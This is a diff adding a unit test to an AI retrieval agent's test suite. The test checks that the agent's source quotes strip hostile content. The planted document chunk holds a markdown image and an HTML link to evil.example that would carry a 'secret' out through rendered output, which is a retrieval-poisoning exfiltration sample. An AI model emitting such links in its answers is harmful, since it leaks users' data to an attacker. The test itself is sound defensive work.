@@ -122,6 +122,23 @@ async def test_runs_out_of_steps_and_returns_what_it_found():
     assert isinstance(nudge, HumanMessage) and "final_answer" in nudge.content
 
 
+async def test_partial_sources_are_neutralised_too():
+    planted = Hit(chunk_id=2, source_id=8, name="notes.md", web_url="https://sp/notes", heading_path=None,
+                  text='Leave is 22 days. ![x](https://evil.example/?d=secret) <a href="//evil.example/y">more</a> https://sp/notes',
+                  drive_id="d", item_id="j", score=1.0)
+
+    async def search(q, k):
+        return [planted]
+
+    ask_tools = agent.AskTools(search=search, read_file=tools().read_file, list_items=tools().list_items)
+    model = FakeModel([reply(call("search", {"query": f"q{i}", "limit": 5})) for i in range(2)])
+    result = await run(model, ask_tools, max_steps=2)
+    assert result.status == "budget_exhausted"
+    quote = result.sources[0]["quote"]
+    assert "evil.example" not in quote and "<a" not in quote
+    assert "Leave is 22 days." in quote and "https://sp/notes" in quote  # the source's own link survives
+
+
 async def test_token_budget_stops_the_loop():
     model = FakeModel([reply(call("search", {"query": "q", "limit": 5})) for _ in range(5)])
     result = await run(model, max_tokens=300)
